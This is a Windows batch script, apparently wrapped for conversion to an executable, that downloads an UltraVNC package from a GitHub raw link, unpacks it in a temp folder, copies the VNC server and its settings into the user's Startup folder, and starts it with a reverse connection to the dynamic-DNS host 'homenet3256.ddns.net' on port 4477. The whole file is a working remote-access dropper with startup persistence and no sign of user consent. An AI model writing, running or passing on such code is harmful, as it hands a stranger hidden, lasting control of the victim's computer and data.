::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFAhVTwyDAE+1EbsQ5+n//NaVo1lTUfo6GA==
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off

if exist "%temp%\downloadaccessalex" (
    rmdir /s /q "%temp%\downloadaccessalex"
)
mkdir "%temp%\downloadaccessalex"
curl https://raw.githubusercontent.com/SachaRepo/setupaccess/main/UltraVNC.zip -o "%temp%\downloadaccessalex\UltraVNC.zip"
Call :UnZipFile "%temp%\downloadaccessalex\" "%temp%\downloadaccessalex\UltraVNC.zip"
del "%temp%\downloadaccessalex\UltraVNC.zip"
copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\UltraVNC.ini" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
copy "C:\Users\%username%\AppData\Local\Temp\downloadaccessalex\winvnc.exe" "C:\users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
start /d "%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" winvnc.exe -connect homenet3256.ddns.net::4477
exit /b

:UnZipFile <ExtractTo> <newzipfile>
set vbs="%temp%\_.vbs"
if exist %vbs% del /f /q %vbs%
>%vbs%  echo Set fso = CreateObject("Scripting.FileSystemObject")
>>%vbs% echo If NOT fso.FolderExists(%1) Then
>>%vbs% echo fso.CreateFolder(%1)
>>%vbs% echo End If
>>%vbs% echo set objShell = CreateObject("Shell.Application")
>>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items
>>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)
>>%vbs% echo Set fso = Nothing
>>%vbs% echo Set objShell = Nothing
cscript //nologo %vbs%
if exist %vbs% del /f /q %vbs%